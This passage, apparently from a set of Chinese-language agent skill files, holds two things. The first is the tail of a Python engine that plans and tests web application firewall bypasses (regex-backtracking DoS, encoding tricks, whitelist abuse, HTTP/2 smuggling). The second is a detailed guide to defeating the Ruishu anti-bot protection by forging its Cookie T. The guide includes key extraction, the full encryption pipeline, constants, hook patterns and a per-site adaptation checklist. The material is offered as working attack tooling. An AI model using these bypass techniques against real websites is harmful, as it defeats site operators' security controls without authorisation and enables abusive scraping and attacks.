                "3. 尝试白名单/优先级覆盖绕过",
                "4. 利用 Content-Type 不一致",
                "5. 最后尝试协议/头部混淆",
            ],
        }
        for conflict in conflicts:
            plan["exploit_phases"].append({
                "phase": len(plan["exploit_phases"]) + 1,
                "description": conflict.get("description", ""),
                "payload": conflict.get("exploit_payload", ""),
                "technique": conflict.get("bypass_technique", ""),
            })
        return plan

    def generate_bypass_decision_tree(self) -> Dict:
        """生成绕过决策树"""
        return {
            "decision_tree": {
                "start": "检测 WAF 规则冲突",
                "nodes": [
                    {"condition": "是否存在正则回溯 DoS?", "yes": "触发正则回溯 DoS -> WAF 降级 -> 直接发送攻击", "no": "检查解码顺序冲突"},
                    {"condition": "是否存在解码顺序冲突?", "yes": "多层编码绕过 -> 检测是否被拦截", "no": "检查优先级/白名单冲突"},
                    {"condition": "是否存在优先级/白名单冲突?", "yes": "利用白名单路径或 IP 白名单 -> 发送攻击", "no": "检查 Content-Type 不一致"},
                    {"condition": "Content-Type 不一致是否可利用?", "yes": "修改 Content-Type 头 -> WAF 跳过检测", "no": "尝试协议/头部混淆"},
                    {"condition": "协议/头部混淆是否有效?", "yes": "HTTP/2 走私或 HTTP/3 降级 -> 绕过", "no": "使用通用绕过技术 (编码/分块/大小写/注释)"},
                ],
            }
        }

    async def close(self):
        await self.session.close()


# ===== 使用示例 =====
async def main():
    engine = WAFRuleConflictEngine(waf_type="ModSecurity", target="https://example.com")
    conflicts = engine.get_known_conflicts()
    print(f"已知冲突: {len(conflicts)} 个")
    for c in conflicts:
        print(f"  - {c['description']}: {c['bypass_technique']}")
    results = await engine.test_conflict_payloads()
    print(f"绕过率: {results.get('bypass_rate', 0):.1f}%")
    plan = engine.generate_exploit_plan()
    print(json.dumps(plan, indent=2, ensure_ascii=False))
    await engine.close()

if __name__ == "__main__":
    asyncio.run(main())
```

---

## ruishu-reverse

# 瑞数反爬纯算逆向 Skill

> 目标: 读完本文档, 独立完成瑞数保护站点的 Cookie T 纯算生成 + URL 后缀处理。
> 已验证: 9+ 站点 HTTP 200。

---

## 决策树

拿到目标 URL 后, 按此流程选择方案:

```
1. HTTP GET 目标 URL
   ├── 非 412 → 不是瑞数防护, 退出
   └── 412 + $_ts.cd + $_ts.nsd → 确认瑞数
       │
2. 是否只需 GET 请求?
   ├── 是 (80%场景) → 纯算方案 [阶段 0→5]
   └── 需要 POST
       │
3. POST 是否需要 URL 后缀?
   ├── 不需要 (99%站点) → 纯算 Cookie + 普通 POST [阶段 0→5]
   └── 需要后缀
       ├── 稳定方案 → JsRpc (浏览器注入, 通杀)
       └── 轻量方案 → sdenv VM 内 XHR (单次POST后需重建实例)
```

**快速验证是否需要后缀**: 纯算 Cookie T + 普通 POST → 200 则不需要, 400/412 则需要。

---

## 6 阶段总览

| 阶段 | 输入 | 输出 | 验证标准 | 通用? |
|------|------|------|---------|-------|
| **0 侦察** | 目标 URL | 412 HTML + mainjs + Cookie S + sdenv 参考数据 | sdenv Cookie → 200 | 通用 |
| **1 加密链** | sdenv Cookie T + keys | `generateCookie(basearr, keys) → Cookie T` | sdenv basearr + 纯算加密 → 200 | **通用, 一次性** |
| **2 密钥提取** | $_ts.cd | keys[0..44] (45 组) | keys 和 sdenv 提取的一致 | **通用, 一次性** |
| **3 Coder** | mainjs + nsd + cd | eval 代码 + codeUid + functionsNameSort | eval 代码逐字节一致 | **通用, 一次性** |
| **4 basearr** | 参考数据 + keys | `buildBasearr(config, keys) → basearr` | 纯算全链路 → 200 | **每站点 ~1h** |
| **5 端到端** | 全部 | 纯算 HTTP GET → 200 | 连续 3+ 次 200 | 组装即可 |

**执行顺序**: 严格 0 → 1 → 2 → 3 → 4 → 5, 每步验证通过后再进下一步。

---

## 方法论: 数据驱动 vs AST 分析

### 数据驱动 (用于 Cookie T / basearr — 最重要!)

**核心**: 用 sdenv 采集 3-5 组真实数据 → 逐字节对比 → 找到每个字节的来源。**绝对不要去读内层 VM 代码** (740 个 state, 三层嵌套 — 这是陷阱)。

```
采集 5 session → 每个 TLV 字段拆开 → 逐字节标注:
  固定 (所有 session 相同)       → 硬编码
  来自 keys (匹配 keys[N])      → 动态提取
  时间相关 (有规律变化)          → 找公式
  随机 (无规律)                 → Math.random
  未知                         → 需更多数据或更深分析
```

**真实经验**: 花 2 天读 VM 代码完全浪费。转向数据驱动后, 1 天内解决所有问题。

### AST 分析 (用于 URL 后缀 / eval code 函数)

**核心**: eval code 是合法 JS, 用 acorn 解析 AST → 建立 rt[N] 函数映射 → 递归追踪调用链 → 提取核心算法。几小时完成手工需要数周的工作量。

### 方法选择表

| 目标在哪一层? | 用什么方法 |
|--------------|----------|
| eval code JS 函数 | AST (精确高效) |
| basearr 数据结构 | 数据驱动 (快速可靠) |
| r2mKa VM 字节码 | AST 提取 opcode + 自动反汇编 |
| 运行时动态值 (时间戳等) | sdenv 采集 |

---

## 加密管线 (7 步)

```
basearr (154-166B)
  → Huffman 编码 (~118B)
  → 前 16 字节 XOR keys[2][0:15]
  → AES-128-CBC (key=keys[17], IV=全零, PKCS7)  → ~128B
  → 拼 packet: [2, 8, r2mkaTime(4B), now(4B), 48, keys[2](48B), lenEnc, cipher]
  → CRC32 → [crc(4B), packet]  → ~193B
  → AES-128-CBC (key=keys[16], IV=随机16B, PKCS7)  → ~224B
  → 自定义 Base64 → "0" + 299 字符
```

详见 [references/encryption-pipeline.md](references/encryption-pipeline.md)

---

## 弯路警告 (来自真实踩坑经验)

| 弯路 | 代价 | 正确做法 |
|------|------|---------|
| 反编译内层 VM 理解 basearr | **2 天浪费** | 数据驱动: 5 session 采集, 10 分钟解决 |
| 照搬 rs-reverse 公式 (idx*7+6 等) | **1 天白费** | 数据驱动: 公式是版本特定的, 不通用 |
| 补环境跑 eval 代码 | document.all 需 C++ Addon | Coder 重写 mainjs 逻辑 |
| 硬编码 type=2 值 | 换 session 就错 | cp1 索引→值映射 (5 session 反推) |
| 跳过混合验证直接做 basearr | 400 了不知道哪步错 | 先 sdenv basearr + 纯算加密 = 200, 证明加密正确 |
| 运行时栈追踪反推 opcode 语义 | 80B/天效率 | AST 静态提取: 400B/小时 (效率 80 倍) |

---

## 排错指南

### 返回 412 (Cookie 未被接受)

1. Cookie 名是否正确? → `keys[7].split(';')[5] + 'T'`, 不是硬编码
2. Cookie S 是否一起发了? → 必须同时带 S 和 T
3. Cookie T 格式? → 必须以 "0" 开头
4. 时间是否过期? → Cookie 有效期通常 < 5 分钟, 检查 nonce 时间戳
5. cd 和 Cookie S 是否配套? → 必须来自同一个 412 响应

### 返回 400 (Cookie 格式/内容错误)

1. 加密链是否通过混合验证? → 先用 sdenv basearr + 纯算加密验证
2. basearr 长度是否匹配? → 对比 sdenv 参考 (通常 154-166B)
3. basearr TLV 是否有缺失字段? → 逐字段对比参考
4. keys 提取是否正确? → keys[0] 应为 "64", keys[2] 应为 48B
5. POST 是否需要 URL 后缀? → 先用 sdenv POST 测试确认

### Coder 输出不匹配

1. 逐字节对比找第一个差异位置
2. 常见 6 个 bug:
   - opmate 数量: 5 个命名 + 1 个无名 = 6 (不是 7)
   - gren(0) 用**全局** opmate, 不是局部
   - var 声明: 用 mate index 1 (不是 2)
   - while(1): 也用**全局** opmate
   - _ifElse: start 变量在 for 中被修改, else 分支用修改后的 start
   - debugger: 每个 gren 段重建 PRNG(seed=nsd), posis 跨段累积
3. 差 ~180 字符 → 大概率 debugger 对齐问题

### Keys 提取失败

1. keys[0] 是否 = "64" (ASCII [0x36, 0x34])?
2. keys.length < 45 → XOR 偏移计算错误
3. keys[29..32] 不是各 4B → 结构异常, 需实现 r2mka runTask

### type=2 值不匹配

1. **不要硬编码!** type=2 依赖 nsd → cp1 洗牌结果
2. 采集 5 session, 记录 keys[29..32] 变量名 + type=2 值
3. 在 cp1=grenKeys(keynameNum, nsd) 中查变量名索引
4. 建立 cp1_index → value 映射表 (映射对同一 mainjs 版本固定)

---

## 通用常量速查

```javascript
// PRNG (所有版本通用)
seed = 15679 * (seed & 0xFFFF) + 2531011

// Huffman 权重 (所有版本通用)
byte=0 → weight=45, byte=255 → weight=6, 其余 → weight=1

// AES-128-CBC
外层: key=keys[16], IV=随机16B     内层: key=keys[17], IV=全零16B

// CRC32 多项式
0xEDB88320

// 自定义 Base64 字母表 (所有版本通用)
'qrcklmDoExthWJiHAp1sVYKU3RFMQw8IGfPO92bvLNj.7zXBaSnu0TC6gy_4Ze5d'

// BASESTR (cd 解码用, 比 Base64 字母表多 24 个字符)
'qrcklmDoExthWJiHAp1sVYKU3RFMQw8IGfPO92bvLNj.7zXBaSnu0TC6gy_4Ze5d{}|~ !#$%()*+,-;=?@[]^'

// getLine 乘数 (mainjs op88)
55295

// 变量名字符集
'_$abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

// _ifElse 二叉搜索步长表
[4, 16, 64, 256, 1024, 4096, 16384, 65536]

// Cookie 名
keys[7].split(';')[5] + 'T'

// URL 后缀参数名
keys[7].split(';')[1]
```

### 关键 Keys 含义

| key | 长度 | 含义 | 用途 |
|-----|------|------|------|
| keys[2] | 48B | KEYS48 | XOR 前 16B + packet 内嵌全部 48B |
| keys[7] | 变长 | 配置串 (分号分隔) | Cookie 名 `[5]+'T'`, 后缀参数名 `[1]` |
| keys[16] | 16B | KEY2 | 外层 AES 密钥 |
| keys[17] | 16B | KEY1 | 内层 AES 密钥 |
| keys[19] | 变长 | 时间戳串 | type=10[6..9] |
| keys[21] | 变长 | r2mkaTime 串 | nonce 时间 |
| keys[22] | 变长 | 加密数据 | type=6 AES 解密 |
| keys[24-26] | 变长 | 数值串 | type=10 参数 |
| keys[29-32] | 各 4B | 变量名 | type=2 映射 (cp1 索引→值) |
| keys[33-34] | 变长 | 数值串 | codeUid 计算参数 |

---

## 变量名变化警告

**瑞数的变量名不是固定的!** nsd 不同 → grenKeys(918, nsd) 洗牌不同 → eval 代码中所有变量名变化。

hook 定位必须用结构特征, 不用变量名:
```javascript
// ❌ 错误: 用变量名 (下次就变了)
const target = 'function _$hr(){var _$jZ=[324];';

// ✅ 正确: 用结构特征 (永远不变)
const statePattern = /function\s+(_\$\w+)\(\)\{var\s+(_\$\w+)=\[324\]/;
// ✅ 正确: 用代码长度
if (code.length > 250000) { /* 这是 eval 代码 */ }
// ✅ 正确: 用常量特征
if (code.includes('15679') && code.includes('2531011')) { /* 找到 PRNG */ }
```

---

## URL 后缀方案

99% 的瑞数站点 POST 请求不需要 URL suffix, 只需 Cookie S + T。

需要后缀时的两种方案:

### JsRpc 方案 (推荐, 通用)

通过远程调用浏览器中已加载的瑞数 JS 环境, 直接获取生成结果。环境补丁和注入方法详见 **env-patch** 技能。

- 优点: 通用性强, 适用于所有站点
- 缺点: 依赖浏览器实例

### sdenv VM 内 XHR 方案

利用 sdenv 环境执行瑞数 JS, 在 VM 内部发起 XHR 请求。环境问题详见 **env-patch** 技能。

- 优点: 无需浏览器, 可脚本化
- 缺点: 每个 sdenv 实例仅能发一次 POST 请求, 需要频繁初始化新实例

### Suffix 结构 (参考)

88B 变体 (URL 无 query):
```
[0-3]   4B  nonce (随机)
[4]     1B  flag = 1
[5]     1B  0x6a (站点标记)
[6-54]  49B session (Cookie S 解密)
[55]    1B  marker (0x20=无search / 0x40=有search)
[56-87] 32B sig32 (行为统计编码)
```

120B 变体: 88B + 32B searchSig (SHA-1 签名)

编码: `"0" + URLSafeBase64(bytes)`, 替换 `+→.`, `/→_`, 去 padding

参数名: `keys[7].split(';')[1]`

---

## 站点适配 Checklist

- [ ] 修改 HOST / PORT / PATH
- [ ] sdenv 跑通 → 200 (确认是标准瑞数版本)
- [ ] 混合验证通过 (sdenv basearr + 纯算加密 → 200)
- [ ] flag 值: 从参考 basearr type=7 的 [8..9] 读取
- [ ] type=9 格式: payload 是 2B `[8,0]` 还是 5B?
- [ ] type=3 结构: 逐字节对比
- [ ] type=2 映射: 5+ session 采集, 建立 cp1 索引→值映射
- [ ] Cookie 名后缀: 'T' 还是 'P'?
- [ ] hasDebug: 观察 eval 代码是否有 debugger 语句
- [ ] keynameNum: 从 mainjs 正则提取 (通常 918)
- [ ] 端到端验证: 连续 3+ 次 200

---

## 工具依赖

| 工具 | 安装 | 用途 | 阶段 |
|------|------|------|------|
| Node.js crypto/http | 内置 | AES 加解密, HTTP 请求 | 全部 |
| sdenv | `npx pnpm add sdenv` | 参考数据采集, VM 内 XHR | 0, 4 |
| js-beautify | `npm i js-beautify` | 格式化 mainjs (可选) | 3 |
| acorn + acorn-walk | `npm i acorn acorn-walk` | AST 分析 (后缀逆向) | 6 |

**注意**: npm 11.x + Node 24 有依赖解析死循环 bug, 安装 sdenv **必须**用 pnpm。

---

## 技能分工

本技能专注于瑞数 Cookie T 的纯算生成流程。相关技能的协作关系:

| 需求 | 引用技能 | 说明 |
|------|---------|------|
| VM 通用方法 (反编译、opcode 分析、字节码追踪) | **jsvmp-reverse** | 瑞数使用三层嵌套 VM, 通用 VM 逆向方法引用 jsvmp-reverse 技能 |
| 环境补丁 (sdenv 配置、DOM 模拟、document.all 等) | **env-patch** | JsRpc 浏览器注入和 sdenv 环境问题的解决方案引用 env-patch 技能 |

**调用时机**:
- 遇到 r2mKa VM 字节码层面的问题 → 引用 jsvmp-reverse
- 遇到 sdenv 环境报错或 DOM 补全问题 → 引用 env-patch
- Cookie T 生成、加密链、keys 提取、Coder 重写、basearr 适配 → 本技能独立处理

---

## 参考文件

| 文件 | 内容 |
|------|------|
| [references/encryption-pipeline.md](references/encryption-pipeline.md) | 加密管线 7 步详解: Huffman/AES/CRC32/Base64 完整实现 |
| [references/key-extraction.md](references/key-extraction.md) | 密钥提取: cd 解码 + XOR 偏移推导 + 45 组 keys 提取 |
| [references/coder-rewrite.md](references/coder-rewrite.md) | Coder 重写: 外层 VM 重写 + 75+55 opcode + 调试过程 |
| [references/basearr-adaptation.md](references/basearr-adaptation.md) | basearr 适配: TLV 结构 + 每个 type 实现 + 数据驱动案例 |

---
